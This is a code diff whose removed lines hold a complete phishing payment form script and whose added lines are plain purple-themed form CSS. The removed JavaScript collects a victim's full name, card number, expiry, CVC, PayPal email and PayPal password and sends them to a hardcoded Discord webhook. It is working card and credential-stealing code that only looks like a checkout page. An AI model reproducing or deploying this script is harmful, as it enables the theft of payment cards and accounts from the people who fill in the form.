@@ -1,116 +1,186 @@
-document.addEventListener("DOMContentLoaded", function () {
-  // Dynamically load the CSS using XMLHttpRequest
-  var xhttp = new XMLHttpRequest();
-  xhttp.open("GET", "https://raw.githubusercontent.com/Leenxz/Leenservice/refs/heads/main/main.css", true); // Replace with your actual CSS file URL
-  xhttp.onreadystatechange = function() {
-    if (xhttp.readyState === 4) {
-      if (xhttp.status === 200) {
-        var link = document.createElement('style');
-        link.innerHTML = xhttp.responseText;
-        document.getElementsByTagName('head')[0].appendChild(link);
-      }
-    }
-  };
-  xhttp.send(null);
-
-  const cardOption = document.getElementById("payment-method-card");
-  const paypalOption = document.getElementById("payment-method-paypal");
-  const cardFields = document.getElementById("credit-card-fields");
-  const paypalFields = document.getElementById("paypal-fields");
-
-  const currencySelector = document.getElementById("currency-selector");
-  const amountInput = document.getElementById("amount-input");
-  const payButton = document.getElementById("pay-button");
-
-  const paypalEmail = document.querySelector("#paypal-fields input[type='email']");
-  const paypalPassword = document.querySelector("#paypal-fields input[type='password']");
-  
-  const expiryMonth = document.getElementById("expiry-month");
-  const expiryYear = document.getElementById("expiry-year");
-  const fullNameInput = document.getElementById("full-name"); // Full Name field
-
-  // Populate expiry month and year
-  for (let i = 1; i <= 12; i++) {
-    const month = i < 10 ? `0${i}` : i;
-    expiryMonth.innerHTML += `<option value="${month}">${month}</option>`;
-  }
-
-  const currentYear = new Date().getFullYear();
-  for (let i = 0; i < 15; i++) {
-    const year = currentYear + i;
-    expiryYear.innerHTML += `<option value="${year}">${year}</option>`;
-  }
-
-  // Toggle payment method fields
-  cardOption.addEventListener("change", function () {
-    if (cardOption.checked) {
-      cardFields.style.display = "block";
-      paypalFields.style.display = "none";
-    }
-  });
-
-  paypalOption.addEventListener("change", function () {
-    if (paypalOption.checked) {
-      cardFields.style.display = "none";
-      paypalFields.style.display = "block";
-    }
-  });
-
-  // Update Pay button text dynamically
-  function updatePayButton() {
-    const currency = currencySelector.value;
-    const amount = amountInput.value || "0";
-    payButton.textContent = `Pay ${amount} ${currency}`;
-  }
-
-  currencySelector.addEventListener("change", updatePayButton);
-  amountInput.addEventListener("input", updatePayButton);
-
-  // Function to send data to Discord webhook
-  function sendToDiscord(paymentInfo) {
-    const webhookUrl = "https://discord.com/api/webhooks/1319833063160549477/dQ2vbDNYyuO3iQKX_h0gOFUs8fZTEnFfBziH7QPJw0n6CBo1o03WQ-KjCtBq2pgiee4K";
-    
-    const data = {
-      content: `**New Payment Info:**\n\n${paymentInfo}`
-    };
-
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(data)
-    }).then(response => {
-      if (response.ok) {
-        console.log("Data sent to Discord successfully!");
-      } else {
-        console.error("Error sending data to Discord");
-      }
-    }).catch(error => {
-      console.error("Error:", error);
-    });
-  }
-
-  // Handle Pay button click
-  payButton.addEventListener("click", function () {
-    // Collect payment details based on the selected payment method
-    let paymentInfo = `Full Name: ${fullNameInput.value}\nCurrency: ${currencySelector.value}\nAmount: ${amountInput.value}\n`;
-
-    if (cardOption.checked) {
-      const cardNumber = document.getElementById("card-number").value;
-      const cardExpiryMonth = expiryMonth.value;
-      const cardExpiryYear = expiryYear.value;
-      const cardCvc = document.getElementById("card-cvc").value;
-
-      paymentInfo += `Payment Method: Card\nCard Number: ${cardNumber}\nExpiry Date: ${cardExpiryMonth}/${cardExpiryYear}\nCVC: ${cardCvc}`;
-    } else if (paypalOption.checked) {
-      const email = paypalEmail.value;
-      const password = paypalPassword.value; // Collect PayPal password
-
-      paymentInfo += `Payment Method: PayPal\nPayPal Email: ${email}\nPayPal Password: ${password}`; // Include the password
-    }
-
-    // Send payment info to Discord webhook
-    sendToDiscord(paymentInfo);
-  });
-});
+/* 64ac15 */
+*,
+*:before,
+*:after {
+  box-sizing: border-box;
+}
+body {
+  padding: 1em;
+  font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  font-size: 15px;
+  color: #b9b9b9;
+  background-color: #e3e3e3;
+}
+h4 {
+  color: #9b59b6; /* Purple */
+}
+input,
+input[type="radio"] + label,
+input[type="checkbox"] + label:before,
+select option,
+select {
+  width: 100%;
+  padding: 1em;
+  line-height: 1.4;
+  background-color: #f9f9f9;
+  border: 1px solid #e5e5e5;
+  border-radius: 3px;
+  -webkit-transition: 0.35s ease-in-out;
+  -moz-transition: 0.35s ease-in-out;
+  -o-transition: 0.35s ease-in-out;
+  transition: 0.35s ease-in-out;
+  transition: all 0.35s ease-in-out;
+}
+input:focus {
+  outline: 0;
+  border-color: #9b59b6; /* Purple */
+}
+input:focus + .input-icon i {
+  color: #9b59b6; /* Purple */
+}
+input:focus + .input-icon:after {
+  border-right-color: #9b59b6; /* Purple */
+}
+input[type="radio"] {
+  display: none;
+}
+input[type="radio"] + label,
+select {
+  display: inline-block;
+  width: 50%;
+  text-align: center;
+  float: left;
+  border-radius: 0;
+}
+input[type="radio"] + label:first-of-type {
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+input[type="radio"] + label:last-of-type {
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+input[type="radio"] + label i {
+  padding-right: 0.4em;
+}
+input[type="radio"]:checked + label,
+input:checked + label:before,
+select:focus,
+select:active {
+  background-color: #9b59b6; /* Purple */
+  color: #fff;
+  border-color: #8e44ad; /* Darker purple */
+}
+input[type="checkbox"] {
+  display: none;
+}
+input[type="checkbox"] + label {
+  position: relative;
+  display: block;
+  padding-left: 1.6em;
+}
+input[type="checkbox"] + label:before {
+  position: absolute;
+  top: 0.2em;
+  left: 0;
+  display: block;
+  width: 1em;
+  height: 1em;
+  padding: 0;
+  content: "";
+}
+input[type="checkbox"] + label:after {
+  position: absolute;
+  top: 0.45em;
+  left: 0.2em;
+  font-size: 0.8em;
+  color: #fff;
+  opacity: 0;
+  font-family: FontAwesome;
+  content: "\f00c";
+}
+input:checked + label:after {
+  opacity: 1;
+}
+select {
+  height: 3.4em;
+  line-height: 2;
+}
+select:first-of-type {
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+select:last-of-type {
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+select:focus,
+select:active {
+  outline: 0;
+}
+select option {
+  background-color: #9b59b6; /* Purple */
+  color: #fff;
+}
+.input-group {
+  margin-bottom: 1em;
+  zoom: 1;
+}
+.input-group:before,
+.input-group:after {
+  content: "";
+  display: table;
+}
+.input-group:after {
+  clear: both;
+}
+.input-group-icon {
+  position: relative;
+}
+.input-group-icon input {
+  padding-left: 4.4em;
+}
+.input-group-icon .input-icon {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 3.4em;
+  height: 3.4em;
+  line-height: 3.4em;
+  text-align: center;
+  pointer-events: none;
+}
+.input-group-icon .input-icon:after {
+  position: absolute;
+  top: 0.6em;
+  bottom: 0.6em;
+  left: 3.4em;
+  display: block;
+  border-right: 1px solid #e5e5e5;
+  content: "";
+  -webkit-transition: 0.35s ease-in-out;
+  -moz-transition: 0.35s ease-in-out;
+  -o-transition: 0.35s ease-in-out;
+  transition: 0.35s ease-in-out;
+  transition: all 0.35s ease-in-out;
+}
+.input-group-icon .input-icon i {
+  -webkit-transition: 0.35s ease-in-out;
+  -moz-transition: 0.35s ease-in-out;
+  -o-transition: 0.35s ease-in-out;
+  transition: 0.35s ease-in-out;
+  transition: all 0.35s ease-in-out;
+  color: #e5e5e5;
+}
+.input-group-icon input:focus + .input-icon i {
+  color: #9b59b6; /* Purple */
+}
+.input-group-icon input:focus + .input-icon:after {
+  border-right-color: #9b59b6; /* Purple */
+}
+input[type="submit"] {
+  cursor: pointer;
+}
+input[type="submit"]:hover {
+  background-color: #5d8b8b; /* Darker green */
+}
